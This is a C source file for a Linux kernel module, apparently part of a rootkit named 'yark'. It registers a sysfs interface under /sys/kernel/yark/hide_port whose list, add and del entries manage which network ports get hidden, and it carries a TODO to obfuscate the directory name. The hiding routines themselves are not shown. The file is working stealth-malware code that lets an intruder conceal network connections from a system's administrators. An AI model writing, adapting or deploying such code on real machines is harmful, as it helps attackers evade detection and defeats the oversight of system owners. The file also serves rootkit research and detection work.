#include <linux/fs.h>
#include <linux/hashtable.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/sysfs.h>

#include "command.h"
#include "hide_port.h"
#include "main.h"

/*
 * For things about sysfs, see:
 * https://www.kernel.org/doc/Documentation/filesystems/sysfs.txt
 */

// TODO: Obfuscate the this path name at compile time:
#define SYS_DIR_NAME "yark"

static ssize_t hide_port_kobj_list(struct kobject *kobj,
                                   struct kobj_attribute *attr, char *buf) {
    size_t remain_size = PAGE_SIZE;
    size_t offset = 0;
    int count;
    int bkt;
    struct hide_port_info *cur;

    hash_for_each(hide_port_info_list, bkt, cur, node) {
        if (remain_size <= 0)
            break;
        count = scnprintf(buf + offset, remain_size, "%d\n", cur->port);
        remain_size -= count;
        offset += count;
    }
    return offset;
}

static ssize_t hide_port_kobj_add(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    unsigned int port;
    int retval;

    retval = kstrtouint(buf, 10, &port);
    if (retval)
        return retval;
    retval = hide_port_add(port);
    if (retval < 0)
        return retval;
    return count;
}

static ssize_t hide_port_kobj_del(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    unsigned int port;
    int retval;

    retval = kstrtouint(buf, 10, &port);
    if (retval)
        return retval;
    retval = hide_port_del(port);
    if (retval < 0)
        return retval;
    return count;
}

static struct kobject *module_kobj;

static struct kobj_attribute hide_port_kobj_list_attribute =
    __ATTR(list, 0400, hide_port_kobj_list, NULL);
static struct kobj_attribute hide_port_kobj_add_attribute =
    __ATTR(add, 0200, NULL, hide_port_kobj_add);
static struct kobj_attribute hide_port_kobj_del_attribute =
    __ATTR(del, 0200, NULL, hide_port_kobj_del);

static struct attribute *hide_port_attrs[] = {
    &hide_port_kobj_list_attribute.attr, &hide_port_kobj_add_attribute.attr,
    &hide_port_kobj_del_attribute.attr, NULL};

static struct attribute_group hide_port_attr_group = {
    .name = "hide_port",
    .attrs = hide_port_attrs,
};

int command_start(void) {
    int retval = 0;

    pr_info(LOG_PREFIX "call command_start()\n");

    /* create /sys/kernel/${SYS_DIR_NAME}/ */
    module_kobj = kobject_create_and_add(SYS_DIR_NAME, kernel_kobj);
    if (!module_kobj)
        return -ENOMEM;
    /* create /sys/kernel/${SYS_DIR_NAME}/hide_port/ */
    retval = sysfs_create_group(module_kobj, &hide_port_attr_group);
    if (retval)
        kobject_put(module_kobj);
    return retval;
}

void command_end(void) {
    pr_info(LOG_PREFIX "call command_end()\n");
    kobject_put(module_kobj);
}
